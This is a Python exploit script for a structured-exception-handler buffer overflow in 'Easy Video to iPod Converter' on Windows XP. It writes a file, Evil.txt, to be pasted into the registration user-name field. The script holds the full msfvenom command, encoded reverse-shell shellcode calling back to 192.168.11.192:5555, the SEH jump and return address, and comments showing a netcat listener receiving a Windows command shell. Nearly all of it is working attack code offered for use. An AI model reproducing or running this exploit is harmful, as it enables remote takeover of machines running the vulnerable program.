#!/usr/bin/python
#COPY THE CONTENT OF TEXT FILE TO REGISTER | USER NAME TO CRASH THE PROGRAM
#root@kali:~/Desktop# nc -nvlp 5555
#listening on [any] 5555 ...
#connect to [192.168.11.192] from (UNKNOWN) [192.168.11.177] 1188
#Microsoft Windows XP [Version 5.1.2600]
#(C) Copyright 1985-2001 Microsoft Corp.
#
#C:\Program Files\Easy Video to iPod Converter>


#1002E525   5F               POP EDI
#1002E526   5E               POP ESI
#1002E527   C3               RETN

#root@kali:~/Desktop# msfvenom -p windows/shell_reverse_tcp lhost=192.168.11.192 lport=5555 -b "\x00\x0a\x0b" -f python
#[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
#[-] No arch selected, selecting arch: x86 from the payload
#Found 10 compatible encoders
#Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
#x86/shikata_ga_nai succeeded with size 351 (iteration=0)
#x86/shikata_ga_nai chosen with final size 351
#Payload size: 351 bytes
#Final size of python file: 1684 bytes
buf =  ""
buf += "\xdb\xc3\xbf\x51\xce\x87\xbb\xd9\x74\x24\xf4\x5a\x2b"
buf += "\xc9\xb1\x52\x31\x7a\x17\x03\x7a\x17\x83\x93\xca\x65"
buf += "\x4e\xef\x3b\xeb\xb1\x0f\xbc\x8c\x38\xea\x8d\x8c\x5f"
buf += "\x7f\xbd\x3c\x2b\x2d\x32\xb6\x79\xc5\xc1\xba\x55\xea"
buf += "\x62\x70\x80\xc5\x73\x29\xf0\x44\xf0\x30\x25\xa6\xc9"
buf += "\xfa\x38\xa7\x0e\xe6\xb1\xf5\xc7\x6c\x67\xe9\x6c\x38"
buf += "\xb4\x82\x3f\xac\xbc\x77\xf7\xcf\xed\x26\x83\x89\x2d"
buf += "\xc9\x40\xa2\x67\xd1\x85\x8f\x3e\x6a\x7d\x7b\xc1\xba"
buf += "\x4f\x84\x6e\x83\x7f\x77\x6e\xc4\xb8\x68\x05\x3c\xbb"
buf += "\x15\x1e\xfb\xc1\xc1\xab\x1f\x61\x81\x0c\xfb\x93\x46"
buf += "\xca\x88\x98\x23\x98\xd6\xbc\xb2\x4d\x6d\xb8\x3f\x70"
buf += "\xa1\x48\x7b\x57\x65\x10\xdf\xf6\x3c\xfc\x8e\x07\x5e"
buf += "\x5f\x6e\xa2\x15\x72\x7b\xdf\x74\x1b\x48\xd2\x86\xdb"
buf += "\xc6\x65\xf5\xe9\x49\xde\x91\x41\x01\xf8\x66\xa5\x38"
buf += "\xbc\xf8\x58\xc3\xbd\xd1\x9e\x97\xed\x49\x36\x98\x65"
buf += "\x89\xb7\x4d\x29\xd9\x17\x3e\x8a\x89\xd7\xee\x62\xc3"
buf += "\xd7\xd1\x93\xec\x3d\x7a\x39\x17\xd6\x45\x16\x1c\xe6"
buf += "\x2e\x65\x22\xf3\x1d\xe0\xc4\x91\x71\xa5\x5f\x0e\xeb"
buf += "\xec\x2b\xaf\xf4\x3a\x56\xef\x7f\xc9\xa7\xbe\x77\xa4"
buf += "\xbb\x57\x78\xf3\xe1\xfe\x87\x29\x8d\x9d\x1a\xb6\x4d"
buf += "\xeb\x06\x61\x1a\xbc\xf9\x78\xce\x50\xa3\xd2\xec\xa8"
buf += "\x35\x1c\xb4\x76\x86\xa3\x35\xfa\xb2\x87\x25\xc2\x3b"
buf += "\x8c\x11\x9a\x6d\x5a\xcf\x5c\xc4\x2c\xb9\x36\xbb\xe6"
buf += "\x2d\xce\xf7\x38\x2b\xcf\xdd\xce\xd3\x7e\x88\x96\xec"
buf += "\x4f\x5c\x1f\x95\xad\xfc\xe0\x4c\x76\x0c\xab\xcc\xdf"
buf += "\x85\x72\x85\x5d\xc8\x84\x70\xa1\xf5\x06\x70\x5a\x02"
buf += "\x16\xf1\x5f\x4e\x90\xea\x2d\xdf\x75\x0c\x81\xe0\x5f"

buffer = "A" * 996 + "\xEB\x06\xEB\x04" + "\x25\xE5\x02\x10" + buf  +"D"* 6000
try:
	f=open("Evil.txt","w")
	print "[+] Creating %s bytes evil payload.." %len(buffer)
	f.write(buffer)
	f.close()
	print "[+] File created!"
except Exception as e:
	print e

